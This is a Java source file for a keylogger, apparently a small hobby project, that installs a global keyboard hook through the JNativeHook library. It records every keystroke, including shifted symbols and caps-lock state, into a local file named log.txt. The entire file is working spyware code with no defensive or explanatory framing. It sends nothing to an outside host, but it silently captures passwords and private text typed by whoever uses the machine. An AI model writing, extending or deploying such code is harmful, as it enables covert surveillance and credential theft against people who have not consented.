package com.pvtoari.keylogger;

import java.io.FileNotFoundException;
import java.io.PrintWriter;
import java.awt.Toolkit;
import java.awt.event.KeyEvent;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class Listener implements NativeKeyListener {
	private static PrintWriter pw;
	private int counting = 0;
	private static boolean caps = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK); // true if caps lock is on, false otherwise
	private static boolean isShift = false;
	private static boolean isAlt = false;
	private static boolean isControl = false; 
	
	public Listener() {
		try {
			pw = new PrintWriter("log.txt");
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		}
	}
	
	public static boolean isLatinLetter(String s) {
		String aux = s;
		aux=aux.toLowerCase();
		return aux.length() == 1 && aux.charAt(0) >= 'a' && aux.charAt(0) <= 'z';
	}
	
	public String parseCap(String s) {
		String res = "";
		res = s;

		if(!isLatinLetter(s) && isShift) {
			switch(s) {
				// this is causing me a seizure
				case "1": res="!"; break;
				case "2": res="\""; break;
				case "3": res="·"; break;
				case "4": res="$"; break;
				case "5": res="%"; break;
				case "6": res="&"; break;
				case "7": res="/"; break;
				case "8": res="("; break;
				case "9": res=")"; break;
				case "0": res="="; break;
			}
		}
		return res;
	}

	public void nativeKeyReleased(NativeKeyEvent e) {

		switch(e.getKeyCode()) {
			case NativeKeyEvent.VC_SHIFT: 
				caps=false;
				isShift=false;
				break;
			case NativeKeyEvent.VC_ALT: 
				isAlt = false;
				break;
		}
	}

	public void nativeKeyPressed(NativeKeyEvent e) {

		this.counting++;
		String toAppend = NativeKeyEvent.getKeyText(e.getKeyCode());

		if(!isLatinLetter(toAppend) && isShift) {
			toAppend = parseCap(toAppend);	
		}

		switch(e.getKeyCode()) {
			case NativeKeyEvent.VC_CAPS_LOCK: 
				caps=!caps; 
				break;
			case NativeKeyEvent.VC_SHIFT: 
				caps=true;
				isShift = true;
				break;
			case NativeKeyEvent.VC_SPACE: 
				pw.append(" ");
				break;
			case NativeKeyEvent.VC_ENTER: 
				pw.append("\n");
				break;
			case NativeKeyEvent.VC_ALT: 
				isAlt = true;
				break;
			default: {
				if(caps==false) toAppend=toAppend.toLowerCase();
				pw.append(toAppend);
			}
		}

		if (this.counting == 48) {
			pw.append("\n");
			this.counting = 0;
		}
	}

	public static void main(String[] args) {
		try {
			GlobalScreen.registerNativeHook();
		}
		catch (NativeHookException ex) {
			System.exit(1);
		}
		
		GlobalScreen.addNativeKeyListener(new Listener());

		
		Runtime.getRuntime().addShutdownHook(new Thread()
			{
				@Override
				public void run()
				{
					pw.flush();
				}
			});
	}
}